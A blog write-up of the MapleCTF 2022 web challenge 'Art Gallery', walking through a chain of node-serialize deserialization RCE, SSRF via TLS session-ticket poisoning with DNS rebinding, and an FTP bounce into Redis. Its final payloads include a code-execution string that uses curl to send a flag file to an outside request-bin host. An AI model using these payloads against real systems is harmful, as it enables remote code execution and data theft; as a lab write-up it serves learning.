---
layout: post
title:  "Art Gallery"
author: "MapleCTF (Vie)"
date:   2022-09-04 00:00:00 +0000
categories: ctf maplectf web
description: "desc desc desc desc"
---

*[CTFTime event](https://ctftime.org/event/1676), [source code](https://ctf2022.maplebacon.org/files/b23f6b3681132411c4488626c123cd8f/artgallervie.zip)*  

MapleCTF was Maple Bacon's debut CTF and featured a ton of cool web challenges that ramped up in difficulty significantly after the first wave. I played with idek and we came [5th](https://ctf2022.maplebacon.org/scoreboard)! Here's my writeup for the web challenge Art Gallery: a collaborative effort with downgrade, Em0n, gapipro and redemer. :)

---  

### Initiation

> You are free to peruse the art gallery to your leisure :) ****
>
> **** Please be aware that the curator does not go through HTTP traffic! They don't like insecure connections :(

Following the link and choosing a name reveals what appears to be an Art Gallery to which you can upload images:

![](/assets/images/ctf/maplectf/art_gallery/front.png)

![](/assets/images/ctf/maplectf/art_gallery/site.png)  

Any images you upload replace one of the existing ones in your gallery and are accessible via the `/files` route, as per the following snippets:

```js
// app.js
app.use('/files', express.static('../ftp/files'));
```

```js
// app.js
app.post("/upload", (req, res) => {
    if (req.session.art_token) {
        //People can upload max 4 images, which are inserted into their images array rolling basis
        let random_filename = crypto.randomBytes(10).toString('hex') + ".png";

        //high quality design 
        req.files.file.mv(`/usr/src/app/ftp/files/${random_filename}`);

        req.images.push(random_filename);
        req.images.shift();
        res.redirect("/");
    } else {
        res.redirect("/");
    }
});
```

We're also given a mysterious art token, the functionality of which is revealed by these snippets:

```js
// app.js
app.post("/login", (req, res) => {
        req.session.art_token = crypto.randomBytes(10).toString('hex');
        req.session.key = req.body.name;
        //default photos (drawn by Vie)
        req.images = ['goose.png', 'girl.png', 'bunny.png', 'motorcycle.png'];
        res.redirect("/");
});
```

```js
// app.js
app.use(async function (req, res, next) {
    if (req.session.art_token) {
        let val = await redisClient.get(`image_${req.session.art_token}`);
        let data_arr = serialize.unserialize(await redisClient.get(`image_${req.session.art_token}`));
        req.images = []
        for (let key in data_arr) {
            req.images.push(data_arr[key]);
        }
    }
    res.on("finish", async function () {
        console.log(req.session);
        if (req.session){
            if (req.session.art_token) {
                await redisClient.set(`image_${req.session.art_token}`, serialize.serialize(req.images));
                let data = await redisClient.get(`image_${req.session.art_token}`);
            }
        }
    });
    next();
});
```

The art token is set after we choose a name. Before every request, the images associated with the user's art token are fetched from Redis by unserializing the value stored at `image_<art token>` using the `node-serialize` package. Then, after each request, if the art token is set, it serializes the user's current images using the same package and stores it back in Redis.

### Controlling Redis

Unserializing arbitrary data can be pretty dangerous, and as it turns out, `node-serialize` allows us to [perform RCE](https://snyk.io/test/npm/node-serialize) if we can control what's passed to the `unserialize` function, which is this:

```js
await redisClient.get(`image_${req.session.art_token}`)
```

Can we control this? This initially seems impossible as the Redis server isn't exposed to us directly. Luckily, there's one more interesting endpoint:

```js
app.get('/query', async (req, res) => {
    let host = req.query.host;
    const port = parseInt(req.query.port);
    try {
        const httpsAgent = new https.Agent({ rejectUnauthorized: false });
        await axios.get(`https://${host}:${port}/`, { httpsAgent });
    } catch (e) {
        console.log("Error encountered");
        console.log(e);
    }
    res.send("The curator will observe your art");
})
```

We can get ~~axios~~ the curator to send an HTTPS request to a host and port of our choosing - this could potentially allow us to execute arbitrary Redis commands! The theory is as follows: consider this example with a plaintext HTTP POST request, where we can send a request to an arbitrary server on the victim's local network (in this case the Redis server) and we control the request body:

```
POST / HTTP/1.1
Host: x-c-3.github.io
Content-Length: 55

SET mykey myvalue
FLUSHALL
OTHER bad redis commands

```

If we sent this to Redis, then ideally the response to the first 3 lines would be:

```
-ERR unknown command 'POST', with args beginning with: '/' 'HTTP/1.1'
-ERR unknown command 'Host:', with args beginning with: 'x-c-3.github.io'
-ERR unknown command 'Content-Length:', with args beginning with: '55'
```

Redis would then treat the body as normal Redis commands and execute them, allowing us to run arbitrary Redis commands!

Unfortunately, there are a few discrepancies between this example and reality, namely:

- Redis really hates `POST` and `Host:` and would immediately die
- The request is sent over HTTPS, which would encrypt any information such as query strings, request bodies and paths, rendering it useless
- Redis also really hates a lot of the special characters that HTTPS requests usually contain

### Getting plaintext in the HTTPS request

How do we get plaintext in the HTTPS request if almost everything we put is encrypted? The answer is via TLS poisoning, which [this repo](https://github.com/jmdx/TLS-poison) helps you set up.

Session IDs and session tickets are part of the TLS protocol and help to optimise the handshake: during an initial handshake between the server and the client, the server provides a session ID or session ticket for the client to send to the server on a subsequent request (if required), so that stages of the handshake can be skipped to speed up the process.

TLS poisoning is based on the idea that one of the things that we could potentially control in a TLS handshake and that isn't encrypted is the session ticket, so we could store our SSRF payload in the session ticket!

If session IDs are used, the ID is associated with the session state on the server-side, and the max length is 32 bytes. In this case, the session ticket is most interesting: the entire session state is stored within the session ticket and sent by the client, so it's more efficient for the server, and the max length is greater. For our purposes, this means that we can store a longer payload.

Session tickets are only sent on subsequent requests to the same host and port, so we aim to achieve the following flow:

```
1. Set host and port to an attacker-controlled domain and the chosen port we'd like to SSRF and initiate the request.
2. DNS resolves the host to the attacker server IP.
3. Provide the client with a malicious session ticket.
4. Redirect the client to us.
5. DNS resolves the host to the local IP.
6. As the host and port are the same, the client sends the malicious session ticket in the Client Hello.
7. Profit
```

This would work fine, but curl actually caches DNS records for 60 seconds, so by following the repo instructions exactly, it would never work: the request would be sent to the same IP twice! Thus, we had to make some modifications to the plan, and the new plan we followed instead involved sending 2 A records first. After the attacker server's job was done, we shut it down, so that when curl tried to reconnect to the attacker server, it failed and tried the next record instead, being the local server. So the real plan was:

```
1. Set host and port to an attacker-controlled domain and the chosen port we'd like to SSRF and initiate the request.
2. DNS resolves the host to two A records, something like:

;; ANSWER SECTION:
attacker.example.com. 1 IN     A       123.123.123.123
attacker.example.com. 1 IN     A       127.0.0.1

3. Provide the client with a malicious session ticket and shut down.
4. Redirect the client to us.
5. curl uses the DNS records from cache and tries to connect to the attacker server, but gets connection refused.
6. curl tries the next DNS record and succeeds.
7. As the host and port are the same, the client sends the malicious session ticket in the Client Hello.
8. Profit
```

### FTP

We now have plaintext in our HTTPS request, but how do we get it to Redis? The answer is via an FTP Bounce attack!

The FTP server has a couple of interesting options set:

```js
// ftpserver.js
var options = {
    host: process.env.IP || '127.0.0.1',
    port: process.env.FTP_PORT || 8021,
    tls: null,
};

server = new ftpd.FtpServer(options.host, {
    getInitialCwd: function() {
        return '/';
    },
    getRoot: function() {
        return process.cwd()+"/files";
    },
    pasvPortRangeStart: 1025,
    pasvPortRangeEnd: 1050,
    tlsOptions: options.tls,
    allowUnauthorizedTls: true,
    useWriteFile: false,
    useReadFile: false,
    uploadMaxSlurpSize: 7000, // N/A unless 'useWriteFile' is true.
});
```

TLS is disabled on the FTP server (i.e not FTPS), which means that we can send plaintext commands directly upon connection to the FTP server without need for a handshake. Therefore, we can SSRF it directly, especially as it's more lax than Redis with regard to special characters.

Importantly, we can send a PORT command to connect to port 6379 (Redis), then we can send any file we choose over this connection, for example one of our uploaded images containing our `node-serialize` payload, using `RETR <filename>`. We're given this by the img src on the gallery page, so our payload to SSRF looks like this:

```
USER a
PASS a
PORT 127,0,0,1,24,235
RETR uploadedfile
```

Doing this would allow us to set a Redis key of our choice to a `node-serialize` payload, which would allow for RCE!

### Final plan

```
1. Enter a name and keep note of the art token
2. Upload your file with Redis payload to set your image key to your node-serialize payload
3. Get the img src of your uploaded file to get the filename
4. Configure your TLS poisoning server to poison the session ticket with your FTP payload to SSRF Redis
5. Configure your TLS poisoning server to be managed by a DNS server that you control, which returns 2 A records for the TLS poisoning server: one attacker, one local
6. Send a request to /query with your attacker host and port 8021 (FTP server port)
7. Poison the session ticket and close the TLS poisoning server
8. Send any request to the server to trigger the node-serialize payload!
```

Final payloads:

```
Uploaded file:

set image_<art token> "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('curl -F \\\"file=@/usr/src/app/flag.txt\\\" <request bin>', function(error, stdout, stderr) { console.log(stdout) });}()\"}"


FTP payload:

USER a
PASS a
PORT 127,0,0,1,24,235
RETR <uploaded_filename>
```

DNS records:

![](/assets/images/ctf/maplectf/art_gallery/dns.png)  

Manually performing the plan with the payloads yields the flag:

```
maple{M4N_I_L0V3_SSRFz_1N_My_SSRF5_In_my_556Fs}
```

Special thanks again to downgrade, Em0n, gapipro and redemer.